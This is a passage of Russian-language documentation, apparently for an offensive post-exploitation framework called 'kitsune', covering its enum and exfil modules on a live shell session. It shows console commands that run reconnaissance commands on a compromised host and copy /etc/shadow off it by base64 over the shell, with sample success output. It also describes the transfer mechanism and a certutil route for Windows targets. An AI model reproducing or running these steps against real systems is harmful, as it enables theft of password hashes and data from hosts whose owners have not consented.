---
title: Post — enum, exfil
---

# Post layer

Работает с **живой сессией** из [payloads/listener](06-payloads.md).

## post/enum

Быстрый пост-разведка за правило по умолчанию:
`id, whoami, hostname, uname -a, pwd` + ваша команда:

```bash
kitsune > use enum
kitsune (post/enum) > set session 0            # index (default: последний)
kitsune (post/enum) > set extra "cat /etc/os-release"
kitsune (post/enum) > run
```

Каждая команда → `loot(post_enum)` — потом красиво падает в отчёт.

## post/exfil

Выкачивание файла через живой шелл (транспорт base64):

```bash
kitsune > use exfil
kitsune (post/exfil) > set path /etc/shadow
kitsune (post/exfil) > set out ./shadow_local  # необязательно
kitsune (post/exfil) > run
# [+] exfiltrated 1448 bytes -> ./shadow_local
```

Как работает: посылает `base64 <path>` → собирает чанки
(до таймаута) → декодит → сохраняет в файл → loot(`exfil`).

**Важно:** требуется общий контекст (unix shell + `/usr/bin/base64`);
на Windows-целях своё (проверено Пути: `certutil -encode` — next iteration).

После: `show loot` / `report` — краденое и разведанное в отчёте.

Дальше: [wireless](08-wireless.md)
